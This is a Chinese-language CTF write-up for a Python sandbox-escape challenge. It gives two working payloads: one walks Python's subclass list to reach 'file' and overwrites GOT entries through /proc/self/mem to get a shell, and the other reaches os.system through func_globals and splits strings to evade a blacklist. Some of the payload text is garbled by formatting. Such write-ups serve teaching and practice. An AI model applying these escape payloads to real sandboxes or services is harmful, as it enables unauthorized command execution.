
# Run1

## 方法一
* [Principle]
> python sandbox
  
* [Purpose]
> python 沙箱逃逸,通过基类中的file,抓取python的elf文件,通过/proc修改GOT表,劫持file-->system 从而 getshell
  
* [Environment]
。 Ubuntu
  
* [Tools]
> nc
  
* [Process]
1. Step 1
> 上来一通fuzz之后,发现七七八八的全部被ban,而通过()基类中的file 可以进行文件读取
  
2. Step 2
``` 
  linux proc文件系统(http://www.tldp.org/LDP/Linux-Filesystem- Hierarchy/html/proc.html)
  
  通过('/usr/bin/python','r').read()把python进程dump下来
  
  sh echo "print ().__class__.__bases__[0].__subclasses__()[40]('/usr/bin/python','r').read()"|nc 127.0.0.1 9999 > python

```
3. Step 3
``` 
    修复下dump下来的elf文件,objdump分析下
  
    sh ✘ xu@ubuntu  ~/tmp/example/source  objdump -R pyhton|grep -E "system|fopen" 00000000008de2b8 R_X86_64_JUMP_SLOT system@GLIBC_2.2.5 00000000008de8c8 R_X86_64_JUMP_SLOT fopen64@GLIBC_2.2.5
  
```
4. Step 4
  读取system地址将其写入fopen中,调用fopen即可getshell,还有cat and ls的命令绕过
  ``` 

> > > (lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8))
or (). **class**. **bases** [0]. **subclasses** ()[40]( "l'+'s"))(().
**class**. **bases** [0]. **subclasses** ()[40]( "/proc/self/mem','r"),().
**class**. **bases** [0]. **subclasses** ()[40]( "/proc/self/mem', 'w', 0\)\)

5c72a1d444cf3121a5d25f2db4147ebb

bin

cpython.py

cpython.pyc

sandbox.py

\(lambda r,w:r.seek\(0x08de2b8\) or w.seek\(0x08de8c8\) or
w.write\(r.read\(8\)\) or
\(\).__class__.__bases__\[0\].__subclasses__\(\)\[40\]\('c'+'at
5c72a1d444cf3121a5d25f2db4147ebb"))((). **class**. **bases** [0].
**subclasses** ()[40]( "/proc/self/mem','r"),(). **class**. **bases** [0].
**subclasses** ()[40]('/proc/self/mem', 'w', 0))
flag{eee93c33d97aa55f785a7d10ba4ae3ce} unknow error,try again :> ```

## **[Summary]**  
```

## 方法二

* 最终payload为
``` 
print ().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ca'+'t'+' /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb')
```
![..](img/Run1/a.png)

``` 
这里主要是调用魔法函数__dict__使得os和system能绕过黑名单，再调用魔方函数__getattribute__来传入对象的方法func_globals，也是能传入字符串，从而能通过拆解字符串来绕过黑名单ls，最后达到命令执行的效果

```